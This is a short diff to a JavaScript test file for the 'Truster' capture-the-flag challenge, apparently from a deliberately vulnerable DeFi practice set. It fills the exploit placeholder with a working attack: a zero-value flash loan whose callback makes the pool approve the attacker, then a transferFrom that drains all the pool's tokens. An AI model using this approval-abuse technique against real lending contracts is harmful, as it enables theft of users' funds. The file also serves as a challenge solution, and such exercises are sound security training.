@@ -29,7 +29,19 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        await this.pool.flashLoan(
+            0,
+            attacker,
+            this.token.address,
+            this.token.contract.methods.approve(attacker, TOKENS_IN_POOL.toString()).encodeABI(),
+            { from: attacker }
+        );
+        await this.token.transferFrom(
+            this.pool.address,
+            attacker,
+            TOKENS_IN_POOL.toString(),
+            { from: attacker }
+        );
     });
 
     after(async function () {
